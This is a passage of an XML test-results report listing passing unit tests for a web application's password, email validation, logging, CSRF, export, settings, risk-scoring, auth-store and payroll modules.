    <testcase classname="generateSecurePassword returns a string of length 16" name="generateSecurePassword returns a string of length 16" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one uppercase letter" name="generateSecurePassword contains at least one uppercase letter" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one lowercase letter" name="generateSecurePassword contains at least one lowercase letter" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one digit" name="generateSecurePassword contains at least one digit" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword contains at least one special character" name="generateSecurePassword contains at least one special character" time="0.001">
    </testcase>
    <testcase classname="generateSecurePassword generates different passwords each call" name="generateSecurePassword generates different passwords each call" time="0.002">
    </testcase>
    <testcase classname="generateSecurePassword 16 chars contain only expected characters" name="generateSecurePassword 16 chars contain only expected characters" time="0.001">
    </testcase>
    <testcase classname="validatePassword with translator uses translator when provided" name="validatePassword with translator uses translator when provided" time="0.003">
    </testcase>
    <testcase classname="validatePassword with translator falls back to Russian when translator returns empty" name="validatePassword with translator falls back to Russian when translator returns empty" time="0.002">
    </testcase>
    <testcase classname="validateEmail expanded detects hotmail typo" name="validateEmail expanded detects hotmail typo" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded detects outlook typo" name="validateEmail expanded detects outlook typo" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded rejects email without valid format" name="validateEmail expanded rejects email without valid format" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded suggests proper format for invalid email" name="validateEmail expanded suggests proper format for invalid email" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded returns info for empty email" name="validateEmail expanded returns info for empty email" time="0">
    </testcase>
    <testcase classname="validateEmail expanded returns error for invalid format" name="validateEmail expanded returns error for invalid format" time="0">
    </testcase>
    <testcase classname="validateEmail expanded returns success for valid email with suggestion" name="validateEmail expanded returns success for valid email with suggestion" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded corrects gmail.com typo - gmial" name="validateEmail expanded corrects gmail.com typo - gmial" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded corrects gmail.com typo - gmai" name="validateEmail expanded corrects gmail.com typo - gmai" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded corrects gmail.com typo - gmil" name="validateEmail expanded corrects gmail.com typo - gmil" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded corrects yahoo.com typo - yahooo" name="validateEmail expanded corrects yahoo.com typo - yahooo" time="0.001">
    </testcase>
    <testcase classname="validateEmail expanded corrects outlook.com typo - outlok" name="validateEmail expanded corrects outlook.com typo - outlok" time="0">
    </testcase>
  </testsuite>
  <testsuite name="logger" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="1.242" tests="42">
    <testcase classname="logger exports logger object with log method" name="logger exports logger object with log method" time="0.018">
    </testcase>
    <testcase classname="logger exports logger object with warn method" name="logger exports logger object with warn method" time="0.004">
    </testcase>
    <testcase classname="logger exports logger object with error method" name="logger exports logger object with error method" time="0.004">
    </testcase>
    <testcase classname="logger exports logger object with info method" name="logger exports logger object with info method" time="0.006">
    </testcase>
    <testcase classname="logger exports logger object with debug method" name="logger exports logger object with debug method" time="0.004">
    </testcase>
    <testcase classname="logger exports logger object with time method" name="logger exports logger object with time method" time="0.004">
    </testcase>
    <testcase classname="logger exports logger.api.call method" name="logger exports logger.api.call method" time="0.004">
    </testcase>
    <testcase classname="logger exports logger.api.response method" name="logger exports logger.api.response method" time="0.004">
    </testcase>
    <testcase classname="logger log does not throw" name="logger log does not throw" time="0.017">
    </testcase>
    <testcase classname="logger warn does not throw" name="logger warn does not throw" time="0.006">
    </testcase>
    <testcase classname="logger error does not throw" name="logger error does not throw" time="0.007">
    </testcase>
    <testcase classname="logger info does not throw" name="logger info does not throw" time="0.006">
    </testcase>
    <testcase classname="logger debug does not throw" name="logger debug does not throw" time="0.005">
    </testcase>
    <testcase classname="logger time does not throw" name="logger time does not throw" time="0.005">
    </testcase>
    <testcase classname="logger time returns a function" name="logger time returns a function" time="0.005">
    </testcase>
    <testcase classname="logger api.call does not throw" name="logger api.call does not throw" time="0.008">
    </testcase>
    <testcase classname="logger api.call with payload does not throw" name="logger api.call with payload does not throw" time="0.006">
    </testcase>
    <testcase classname="logger api.response does not throw" name="logger api.response does not throw" time="0.005">
    </testcase>
    <testcase classname="logger api.response with data does not throw" name="logger api.response with data does not throw" time="0.005">
    </testcase>
    <testcase classname="logger error logs in production too" name="logger error logs in production too" time="0.008">
    </testcase>
    <testcase classname="logger - multiple arguments log accepts multiple arguments" name="logger - multiple arguments log accepts multiple arguments" time="0.008">
    </testcase>
    <testcase classname="logger - multiple arguments warn accepts multiple arguments" name="logger - multiple arguments warn accepts multiple arguments" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments error accepts multiple arguments" name="logger - multiple arguments error accepts multiple arguments" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments info accepts multiple arguments" name="logger - multiple arguments info accepts multiple arguments" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments debug accepts multiple arguments" name="logger - multiple arguments debug accepts multiple arguments" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments log accepts string arg" name="logger - multiple arguments log accepts string arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments warn accepts string arg" name="logger - multiple arguments warn accepts string arg" time="0.004">
    </testcase>
    <testcase classname="logger - multiple arguments error accepts string arg" name="logger - multiple arguments error accepts string arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments info accepts string arg" name="logger - multiple arguments info accepts string arg" time="0.004">
    </testcase>
    <testcase classname="logger - multiple arguments debug accepts string arg" name="logger - multiple arguments debug accepts string arg" time="0.004">
    </testcase>
    <testcase classname="logger - multiple arguments log accepts object arg" name="logger - multiple arguments log accepts object arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments warn accepts object arg" name="logger - multiple arguments warn accepts object arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments error accepts object arg" name="logger - multiple arguments error accepts object arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments info accepts object arg" name="logger - multiple arguments info accepts object arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments debug accepts object arg" name="logger - multiple arguments debug accepts object arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments log accepts array arg" name="logger - multiple arguments log accepts array arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments warn accepts array arg" name="logger - multiple arguments warn accepts array arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments error accepts array arg" name="logger - multiple arguments error accepts array arg" time="0.006">
    </testcase>
    <testcase classname="logger - multiple arguments info accepts array arg" name="logger - multiple arguments info accepts array arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments debug accepts array arg" name="logger - multiple arguments debug accepts array arg" time="0.005">
    </testcase>
    <testcase classname="logger - multiple arguments api.call with various methods" name="logger - multiple arguments api.call with various methods" time="0.009">
    </testcase>
    <testcase classname="logger - multiple arguments api.response with various status codes" name="logger - multiple arguments api.response with various status codes" time="0.019">
    </testcase>
  </testsuite>
  <testsuite name="validateEnvironment" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="1.056" tests="9">
    <testcase classname="validateEnvironment passes when all required env vars are present" name="validateEnvironment passes when all required env vars are present" time="0.003">
    </testcase>
    <testcase classname="validateEnvironment throws when required env vars are missing" name="validateEnvironment throws when required env vars are missing" time="0.062">
    </testcase>
    <testcase classname="validateEnvironment throws with specific missing variable names" name="validateEnvironment throws with specific missing variable names" time="0.004">
    </testcase>
    <testcase classname="validateEnvironment throws when single required var is missing" name="validateEnvironment throws when single required var is missing" time="0.003">
    </testcase>
    <testcase classname="getEnv returns env value when present" name="getEnv returns env value when present" time="0.001">
    </testcase>
    <testcase classname="getEnv returns default value when env missing" name="getEnv returns default value when env missing" time="0.001">
    </testcase>
    <testcase classname="getEnv throws when env missing and no default" name="getEnv throws when env missing and no default" time="0.002">
    </testcase>
    <testcase classname="getEnv returns env value over default when both exist" name="getEnv returns env value over default when both exist" time="0.001">
    </testcase>
    <testcase classname="getEnv throws when default is empty string (falsy fallback)" name="getEnv throws when default is empty string (falsy fallback)" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="withTracing" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:01" time="0.943" tests="17">
    <testcase classname="withTracing calls the wrapped function and returns its result" name="withTracing calls the wrapped function and returns its result" time="0.004">
    </testcase>
    <testcase classname="withTracing sets attributes on the span" name="withTracing sets attributes on the span" time="0.003">
    </testcase>
    <testcase classname="withTracing sets status to OK on success" name="withTracing sets status to OK on success" time="0.002">
    </testcase>
    <testcase classname="withTracing records exception and sets ERROR status on failure" name="withTracing records exception and sets ERROR status on failure" time="0.033">
    </testcase>
    <testcase classname="withTracing calls span.end in finally block" name="withTracing calls span.end in finally block" time="0.001">
    </testcase>
    <testcase classname="withTracing calls span.end even on error" name="withTracing calls span.end even on error" time="0.003">
    </testcase>
    <testcase classname="withTracing works without attributes" name="withTracing works without attributes" time="0.001">
    </testcase>
    <testcase classname="tracingMiddleware calls the handler and returns its response" name="tracingMiddleware calls the handler and returns its response" time="0.005">
    </testcase>
    <testcase classname="tracingMiddleware sets HTTP attributes on the span" name="tracingMiddleware sets HTTP attributes on the span" time="0.003">
    </testcase>
    <testcase classname="tracingMiddleware sets status_code attribute" name="tracingMiddleware sets status_code attribute" time="0.002">
    </testcase>
    <testcase classname="tracingMiddleware handles errors and records exception" name="tracingMiddleware handles errors and records exception" time="0.004">
    </testcase>
    <testcase classname="tracingMiddleware generates span name from method + pathname" name="tracingMiddleware generates span name from method + pathname" time="0.004">
    </testcase>
    <testcase classname="withServerActionTracing returns a decorated function" name="withServerActionTracing returns a decorated function" time="0.001">
    </testcase>
    <testcase classname="withServerActionTracing decorated function returns original result" name="withServerActionTracing decorated function returns original result" time="0.001">
    </testcase>
    <testcase classname="withServerActionTracing passes arguments to original function" name="withServerActionTracing passes arguments to original function" time="0.001">
    </testcase>
    <testcase classname="addSpanAttributes does not throw when no active span exists" name="addSpanAttributes does not throw when no active span exists" time="0.001">
    </testcase>
    <testcase classname="addSpanAttributes sets attributes when active span exists" name="addSpanAttributes sets attributes when active span exists" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="withCsrfProtection" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:01" time="0.834" tests="14">
    <testcase classname="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes GET requests through without CSRF check" name="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes GET requests through without CSRF check" time="0.006">
    </testcase>
    <testcase classname="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes HEAD requests through" name="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes HEAD requests through" time="0.001">
    </testcase>
    <testcase classname="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes OPTIONS requests through" name="withCsrfProtection safe methods (GET, HEAD, OPTIONS) passes OPTIONS requests through" time="0.001">
    </testcase>
    <testcase classname="withCsrfProtection safe methods (GET, HEAD, OPTIONS) returns 500 if handler returns undefined for safe method" name="withCsrfProtection safe methods (GET, HEAD, OPTIONS) returns 500 if handler returns undefined for safe method" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for POST requests" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for POST requests" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) verifies CSRF token when protection is required" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) verifies CSRF token when protection is required" time="0.001">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) returns 403 when CSRF token is invalid" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) returns 403 when CSRF token is invalid" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) does NOT call handler when CSRF fails" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) does NOT call handler when CSRF fails" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) skips CSRF check when requiresCsrfProtection returns false" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) skips CSRF check when requiresCsrfProtection returns false" time="0.003">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) returns 500 if handler returns undefined for unsafe method" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) returns 500 if handler returns undefined for unsafe method" time="0.001">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for PUT" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for PUT" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for DELETE" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for DELETE" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for PATCH" name="withCsrfProtection unsafe methods (POST, PUT, DELETE, PATCH) checks CSRF for PATCH" time="0.002">
    </testcase>
    <testcase classname="withCsrfProtection edge cases returns handler response directly" name="withCsrfProtection edge cases returns handler response directly" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="exportDocumentToPDF" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:01" time="1.151" tests="13">
    <testcase classname="exportDocumentToPDF calls pdfmake createPdf and download with given filename" name="exportDocumentToPDF calls pdfmake createPdf and download with given filename" time="0.026">
    </testcase>
    <testcase classname="exportDocumentToPDF includes signature block when signature=true" name="exportDocumentToPDF includes signature block when signature=true" time="0.003">
    </testcase>
    <testcase classname="exportDocumentToPDF handles pdfmake with vfs already set" name="exportDocumentToPDF handles pdfmake with vfs already set" time="0.004">
    </testcase>
    <testcase classname="exportDocumentToPDF uses default filename when not provided" name="exportDocumentToPDF uses default filename when not provided" time="0.004">
    </testcase>
    <testcase classname="renderDocumentPdfBase64 resolves with base64 data URL on success" name="renderDocumentPdfBase64 resolves with base64 data URL on success" time="0.004">
    </testcase>
    <testcase classname="renderDocumentPdfBase64 rejects when getBase64 returns empty data" name="renderDocumentPdfBase64 rejects when getBase64 returns empty data" time="0.107">
    </testcase>
    <testcase classname="renderDocumentPdfBase64 rejects on timeout after 30s" name="renderDocumentPdfBase64 rejects on timeout after 30s" time="0.024">
    </testcase>
    <testcase classname="renderDocumentPdfBase64 rejects on pdfmake exception" name="renderDocumentPdfBase64 rejects on pdfmake exception" time="0.004">
    </testcase>
    <testcase classname="exportDocumentToDOCX produces a DOCX with header and body" name="exportDocumentToDOCX produces a DOCX with header and body" time="0.005">
    </testcase>
    <testcase classname="exportDocumentToDOCX includes signature block when signature=true" name="exportDocumentToDOCX includes signature block when signature=true" time="0.002">
    </testcase>
    <testcase classname="exportDocumentToDOCX includes contentHash in footer" name="exportDocumentToDOCX includes contentHash in footer" time="0.002">
    </testcase>
    <testcase classname="types RenderableDocument interface accepts all fields" name="types RenderableDocument interface accepts all fields" time="0.001">
    </testcase>
    <testcase classname="types accepts optional contentHash and signed fields" name="types accepts optional contentHash and signed fields" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="settings.getUserSettings" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:01" time="0.893" tests="25">
    <testcase classname="settings.getUserSettings returns null when unauthenticated" name="settings.getUserSettings returns null when unauthenticated" time="0.002">
    </testcase>
    <testcase classname="settings.getUserSettings returns defaults from existing settings doc" name="settings.getUserSettings returns defaults from existing settings doc" time="0.002">
    </testcase>
    <testcase classname="settings.getUserSettings creates settings doc from user fallback when no settings exist" name="settings.getUserSettings creates settings doc from user fallback when no settings exist" time="0.001">
    </testcase>
    <testcase classname="settings.getUserSettings throws when user not found during fallback creation" name="settings.getUserSettings throws when user not found during fallback creation" time="0.04">
    </testcase>
    <testcase classname="settings.getUserSettings applies defaults for missing fields" name="settings.getUserSettings applies defaults for missing fields" time="0.001">
    </testcase>
    <testcase classname="settings.updateUserSettings rejects unauthenticated caller" name="settings.updateUserSettings rejects unauthenticated caller" time="0.002">
    </testcase>
    <testcase classname="settings.updateUserSettings patches only provided fields" name="settings.updateUserSettings patches only provided fields" time="0.001">
    </testcase>
    <testcase classname="settings.updateUserSettings skips undefined values" name="settings.updateUserSettings skips undefined values" time="0.001">
    </testcase>
    <testcase classname="settings.updateUserSettings returns success" name="settings.updateUserSettings returns success" time="0.001">
    </testcase>
    <testcase classname="settings.updateLocalizationSettings rejects unauthenticated caller" name="settings.updateLocalizationSettings rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="settings.updateLocalizationSettings updates settings and patches user record language" name="settings.updateLocalizationSettings updates settings and patches user record language" time="0.002">
    </testcase>
    <testcase classname="settings.updateLocalizationSettings returns success" name="settings.updateLocalizationSettings returns success" time="0.001">
    </testcase>
    <testcase classname="settings.updateNotificationSettings rejects unauthenticated caller" name="settings.updateNotificationSettings rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="settings.updateNotificationSettings patches notification fields" name="settings.updateNotificationSettings patches notification fields" time="0.002">
    </testcase>
    <testcase classname="settings.updateThemeSettings rejects unauthenticated caller" name="settings.updateThemeSettings rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="settings.updateThemeSettings updates theme only" name="settings.updateThemeSettings updates theme only" time="0.001">
    </testcase>
    <testcase classname="settings.updateSessionProfile rejects unauthenticated caller" name="settings.updateSessionProfile rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="settings.updateSessionProfile patches only defined profile fields" name="settings.updateSessionProfile patches only defined profile fields" time="0.001">
    </testcase>
    <testcase classname="settings.updateSessionProfile skips patch when no recognized fields change" name="settings.updateSessionProfile skips patch when no recognized fields change" time="0.001">
    </testcase>
    <testcase classname="settings.getOrganizationSettings throws when unauthenticated" name="settings.getOrganizationSettings throws when unauthenticated" time="0.001">
    </testcase>
    <testcase classname="settings.getOrganizationSettings allows same-org caller to read org settings" name="settings.getOrganizationSettings allows same-org caller to read org settings" time="0.002">
    </testcase>
    <testcase classname="settings.getOrganizationSettings throws for cross-org caller (non-superadmin)" name="settings.getOrganizationSettings throws for cross-org caller (non-superadmin)" time="0.001">
    </testcase>
    <testcase classname="settings.getOrganizationSettings allows superadmin to read any org" name="settings.getOrganizationSettings allows superadmin to read any org" time="0">
    </testcase>
    <testcase classname="settings.getOrganizationSettings throws when organization not found" name="settings.getOrganizationSettings throws when organization not found" time="0.001">
    </testcase>
    <testcase classname="settings.getOrganizationSettings applies defaults for missing org fields" name="settings.getOrganizationSettings applies defaults for missing org fields" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="ContextResult interface shape" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:01" time="0.835" tests="12">
    <testcase classname="ContextResult interface shape has all expected string fields" name="ContextResult interface shape has all expected string fields" time="0.003">
    </testcase>
    <testcase classname="fetchAllContexts returns default values when all fetches fail" name="fetchAllContexts returns default values when all fetches fail" time="0.006">
    </testcase>
    <testcase classname="fetchAllContexts uses cookie-based auth headers" name="fetchAllContexts uses cookie-based auth headers" time="0.002">
    </testcase>
    <testcase classname="fetchAllContexts requests insights when needsInsights is true and userId is provided" name="fetchAllContexts requests insights when needsInsights is true and userId is provided" time="0.003">
    </testcase>
    <testcase classname="fetchAllContexts returns empty insights when needsInsights is false" name="fetchAllContexts returns empty insights when needsInsights is false" time="0.003">
    </testcase>
    <testcase classname="fetchAllContexts returns empty insights when userId is empty" name="fetchAllContexts returns empty insights when userId is empty" time="0.001">
    </testcase>
    <testcase classname="fetchAllContexts returns empty conflictCheckData when needsConflictCheck is false" name="fetchAllContexts returns empty conflictCheckData when needsConflictCheck is false" time="0.001">
    </testcase>
    <testcase classname="fetchAllContexts returns empty conflictCheckData when userId is empty even with needsConflictCheck" name="fetchAllContexts returns empty conflictCheckData when userId is empty even with needsConflictCheck" time="0.001">
    </testcase>
    <testcase classname="fetchAllContexts requests full context when needsFullContext is true" name="fetchAllContexts requests full context when needsFullContext is true" time="0.001">
    </testcase>
    <testcase classname="fetchAllContexts returns empty fullContext when needsFullContext is false" name="fetchAllContexts returns empty fullContext when needsFullContext is false" time="0.001">
    </testcase>
    <testcase classname="fetchAllContexts populates user context from API response" name="fetchAllContexts populates user context from API response" time="0.004">
    </testcase>
    <testcase classname="fetchAllContexts handles partial fetch failures gracefully" name="fetchAllContexts handles partial fetch failures gracefully" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="calculateRiskScore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.796" tests="15">
    <testcase classname="calculateRiskScore returns low risk for trusted device with normal conditions" name="calculateRiskScore returns low risk for trusted device with normal conditions" time="0.004">
    </testcase>
    <testcase classname="calculateRiskScore returns high risk for unknown device with multiple failed attempts" name="calculateRiskScore returns high risk for unknown device with multiple failed attempts" time="0.001">
    </testcase>
    <testcase classname="calculateRiskScore returns medium risk for moderate anomalies" name="calculateRiskScore returns medium risk for moderate anomalies" time="0.002">
    </testcase>
    <testcase classname="calculateRiskScore clamps score to 0-100 range" name="calculateRiskScore clamps score to 0-100 range" time="0.001">
    </testcase>
    <testcase classname="calculateRiskScore reduces risk for face_id auth method" name="calculateRiskScore reduces risk for face_id auth method" time="0.001">
    </testcase>
    <testcase classname="calculateRiskScore reduces risk for webauthn auth method" name="calculateRiskScore reduces risk for webauthn auth method" time="0.001">
    </testcase>
    <testcase classname="calculateRiskScore adds risk factors for new device" name="calculateRiskScore adds risk factors for new device" time="0.001">
    </testcase>
    <testcase classname="calculateRiskScore adds risk factors for failed attempts" name="calculateRiskScore adds risk factors for failed attempts" time="0.002">
    </testcase>
    <testcase classname="calculateRiskScore adds risk factors for unusual login hour" name="calculateRiskScore adds risk factors for unusual login hour" time="0">
    </testcase>
    <testcase classname="calculateRiskScore adds risk factors for keystroke mismatch" name="calculateRiskScore adds risk factors for keystroke mismatch" time="0">
    </testcase>
    <testcase classname="calculateRiskScore adds risk factors for long absence" name="calculateRiskScore adds risk factors for long absence" time="0.001">
    </testcase>
    <testcase classname="compareKeystrokeTimings returns 1.0 for identical timings" name="compareKeystrokeTimings returns 1.0 for identical timings" time="0.002">
    </testcase>
    <testcase classname="compareKeystrokeTimings returns lower similarity for very different timings" name="compareKeystrokeTimings returns lower similarity for very different timings" time="0.001">
    </testcase>
    <testcase classname="compareKeystrokeTimings uses stdDev tolerances when provided" name="compareKeystrokeTimings uses stdDev tolerances when provided" time="0">
    </testcase>
    <testcase classname="compareKeystrokeTimings returns value between 0 and 1" name="compareKeystrokeTimings returns value between 0 and 1" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="useAuthStore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.851" tests="24">
    <testcase classname="useAuthStore initial state starts with null user" name="useAuthStore initial state starts with null user" time="0.003">
    </testcase>
    <testcase classname="useAuthStore initial state starts unauthenticated" name="useAuthStore initial state starts unauthenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore initial state starts with needsOnboarding false" name="useAuthStore initial state starts with needsOnboarding false" time="0.001">
    </testcase>
    <testcase classname="useAuthStore login sets user and marks authenticated" name="useAuthStore login sets user and marks authenticated" time="0.002">
    </testcase>
    <testcase classname="useAuthStore login sets needsOnboarding true when user has no organizationId" name="useAuthStore login sets needsOnboarding true when user has no organizationId" time="0">
    </testcase>
    <testcase classname="useAuthStore login sets needsOnboarding true when user is not approved" name="useAuthStore login sets needsOnboarding true when user is not approved" time="0">
    </testcase>
    <testcase classname="useAuthStore login sets needsOnboarding false when user has org and is approved" name="useAuthStore login sets needsOnboarding false when user has org and is approved" time="0">
    </testcase>
    <testcase classname="useAuthStore setUser sets user and marks authenticated" name="useAuthStore setUser sets user and marks authenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore setUser sets needsOnboarding when org missing" name="useAuthStore setUser sets needsOnboarding when org missing" time="0.001">
    </testcase>
    <testcase classname="useAuthStore logout clears user and sets unauthenticated" name="useAuthStore logout clears user and sets unauthenticated" time="0.002">
    </testcase>
    <testcase classname="useAuthStore checkOnboarding returns false when user has org and is approved" name="useAuthStore checkOnboarding returns false when user has org and is approved" time="0.001">
    </testcase>
    <testcase classname="useAuthStore checkOnboarding returns true when user has no org" name="useAuthStore checkOnboarding returns true when user has no org" time="0.001">
    </testcase>
    <testcase classname="useAuthStore checkOnboarding returns true when user is not approved" name="useAuthStore checkOnboarding returns true when user is not approved" time="0.001">
    </testcase>
    <testcase classname="useAuthStore validateAndCleanup does nothing when not authenticated" name="useAuthStore validateAndCleanup does nothing when not authenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore validateAndCleanup calls logout when user exists" name="useAuthStore validateAndCleanup calls logout when user exists" time="0.001">
    </testcase>
    <testcase classname="useAuthStore persist partialize only persists user and isAuthenticated keys" name="useAuthStore persist partialize only persists user and isAuthenticated keys" time="0.002">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthUser returns null when not authenticated" name="useAuthStore — selectors useAuthUser returns null when not authenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthUser returns user when authenticated" name="useAuthStore — selectors useAuthUser returns user when authenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthIsAuthenticated returns true after login" name="useAuthStore — selectors useAuthIsAuthenticated returns true after login" time="0.001">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthIsAuthenticated returns false after logout" name="useAuthStore — selectors useAuthIsAuthenticated returns false after logout" time="0.001">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthNeedsOnboarding returns false for fully onboarded user" name="useAuthStore — selectors useAuthNeedsOnboarding returns false for fully onboarded user" time="0">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthNeedsOnboarding returns true when org missing" name="useAuthStore — selectors useAuthNeedsOnboarding returns true when org missing" time="0.001">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthLogout returns the logout function" name="useAuthStore — selectors useAuthLogout returns the logout function" time="0">
    </testcase>
    <testcase classname="useAuthStore — selectors useAuthValidate returns the validateAndCleanup function" name="useAuthStore — selectors useAuthValidate returns the validateAndCleanup function" time="0">
    </testcase>
  </testsuite>
  <testsuite name="calculatePayroll — Armenia (default rule)" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.904" tests="10">
    <testcase classname="calculatePayroll — Armenia (default rule) applies 20% income tax + 5% social security below the 3M threshold" name="calculatePayroll — Armenia (default rule) applies 20% income tax + 5% social security below the 3M threshold" time="0.003">
    </testcase>
    <testcase classname="calculatePayroll — Armenia (default rule) applies the 23% top bracket above the 3M threshold" name="calculatePayroll — Armenia (default rule) applies the 23% top bracket above the 3M threshold" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — Russia (default rule) applies 13% income tax and employer contributions" name="calculatePayroll — Russia (default rule) applies 13% income tax and employer contributions" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — overtime adds overtime pay at 1.5x into gross" name="calculatePayroll — overtime adds overtime pay at 1.5x into gross" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — taxOverride is a no-op when override is null/undefined (matches default)" name="calculatePayroll — taxOverride is a no-op when override is null/undefined (matches default)" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — taxOverride overrides income-tax brackets wholesale" name="calculatePayroll — taxOverride overrides income-tax brackets wholesale" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — taxOverride overrides employee contributions (e.g. adds a stamp-duty line)" name="calculatePayroll — taxOverride overrides employee contributions (e.g. adds a stamp-duty line)" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — taxOverride can clear contributions with an empty array" name="calculatePayroll — taxOverride can clear contributions with an empty array" time="0.001">
    </testcase>
    <testcase classname="calculatePayroll — taxOverride overrides taxFreeAllowance" name="calculatePayroll — taxOverride overrides taxFreeAllowance" time="0">
    </testcase>
    <testcase classname="computeGrossFromNet — respects taxOverride round-trips a net back to a self-consistent gross under an override" name="computeGrossFromNet — respects taxOverride round-trips a net back to a self-consistent gross under an override" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="CHAT_BACKGROUNDS data" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.671" tests="15">
    <testcase classname="CHAT_BACKGROUNDS data has 27 backgrounds defined" name="CHAT_BACKGROUNDS data has 27 backgrounds defined" time="0.002">
    </testcase>
    <testcase classname="CHAT_BACKGROUNDS data all backgrounds have required fields" name="CHAT_BACKGROUNDS data all backgrounds have required fields" time="0.027">
    </testcase>
    <testcase classname="CHAT_BACKGROUNDS data has unique ids" name="CHAT_BACKGROUNDS data has unique ids" time="0.001">
    </testcase>
    <testcase classname="CHAT_BACKGROUNDS data includes the default background" name="CHAT_BACKGROUNDS data includes the default background" time="0.014">
    </testcase>
    <testcase classname="CHAT_BACKGROUNDS data has backgrounds of each type" name="CHAT_BACKGROUNDS data has backgrounds of each type" time="0.001">
    </testcase>
    <testcase classname="CHAT_BACKGROUNDS data has backgrounds of each category" name="CHAT_BACKGROUNDS data has backgrounds of each category" time="0.001">
    </testcase>
    <testcase classname="getBackgroundById returns background for valid id" name="getBackgroundById returns background for valid id" time="0">
    </testcase>
    <testcase classname="getBackgroundById returns undefined for unknown id" name="getBackgroundById returns undefined for unknown id" time="0">
    </testcase>
